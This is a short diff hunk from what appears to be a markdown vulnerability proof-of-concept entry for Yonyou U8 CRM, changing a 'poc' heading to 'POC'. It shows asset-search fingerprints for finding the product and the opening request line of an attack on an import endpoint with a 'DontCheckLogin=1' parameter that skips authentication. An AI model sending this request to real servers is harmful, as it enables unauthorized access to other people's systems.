@@ -14,7 +14,7 @@ app.name="用友 CRM"
 body="用友U8CRM"
 ```
 
-## poc
+## POC
 
 ```yaml
 POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
